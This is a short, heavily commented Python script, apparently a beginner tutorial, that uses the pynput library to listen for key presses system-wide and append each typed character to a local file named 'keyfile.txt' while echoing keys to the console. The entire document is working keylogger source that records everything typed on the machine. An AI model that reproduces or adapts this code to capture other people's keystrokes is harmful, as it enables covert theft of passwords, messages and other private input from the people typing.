# Import the keyboard module from the pynput library
# This allows Python to listen for keyboard events
from pynput import keyboard

# Define a function to handle each key press
def keyPressed(key):
    # Print the key to the console for real-time feedback
    print(str(key))
    
    # Open (or create) a file called "keyfile.txt" in append mode
    # 'a' mode ensures new key presses are added to the end of the file
    with open("keyfile.txt", 'a') as logKey:
        try:
            # Try to get the character associated with the key press
            char = key.char
            # Write the character to the log file
            logKey.write(char)
        except:
            # Handles special keys (like Shift, Enter, etc.) that don't have a 'char' attribute
            print("Error getting char")

# Main execution block
if __name__ == "__main__":
    # Create a Listener object that listens for key presses
    # Calls the keyPressed function whenever a key is pressed
    listener = keyboard.Listener(on_press=keyPressed)
    
    # Start the listener in a separate thread so it doesn't block the program
    listener.start()
    
    # Keeps the program running so the listener can continue capturing key presses
    # Waiting for user input here acts as a simple way to keep the script alive
    input()
